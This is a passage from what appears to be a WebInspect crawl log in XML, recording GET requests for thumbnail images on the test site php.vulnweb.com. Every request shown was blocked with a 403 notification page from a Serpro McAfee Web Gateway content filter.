      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E4EA982328348C1381E86C20B52B3C8E"><URL>http://php.vulnweb.com:80/pictures/3.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="E4EA982328348C1381E86C20B52B3C8E"><![CDATA[GET /pictures/3.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="E4EA982328348C1381E86C20B52B3C8E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a59c81d6";
X-Request-Memo: ID="2e26a1ea";sc="2";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/3.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="E4EA982328348C1381E86C20B52B3C8E"><Method>GET</Method><Path>/pictures/</Path><File>3.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="E4EA982328348C1381E86C20B52B3C8E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a59c81d6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="2e26a1ea";sc="2";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/3.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2911F93E6093F658C9231D0E8F48A053"><URL>http://php.vulnweb.com:80/pictures/4.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="2911F93E6093F658C9231D0E8F48A053"><![CDATA[GET /pictures/4.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="2911F93E6093F658C9231D0E8F48A053";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2bee395d";
X-Request-Memo: ID="ce49b8e5";sc="2";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/4.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="2911F93E6093F658C9231D0E8F48A053"><Method>GET</Method><Path>/pictures/</Path><File>4.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="2911F93E6093F658C9231D0E8F48A053";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2bee395d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ce49b8e5";sc="2";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/4.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B0FAAD259EA0EB4318492E36606967F8"><URL>http://php.vulnweb.com:80/pictures/5.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="B0FAAD259EA0EB4318492E36606967F8"><![CDATA[GET /pictures/5.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="B0FAAD259EA0EB4318492E36606967F8";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="66095657";
X-Request-Memo: ID="8a5f020d";sc="2";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/5.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:09</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="B0FAAD259EA0EB4318492E36606967F8"><Method>GET</Method><Path>/pictures/</Path><File>5.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="B0FAAD259EA0EB4318492E36606967F8";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="66095657";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8a5f020d";sc="2";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 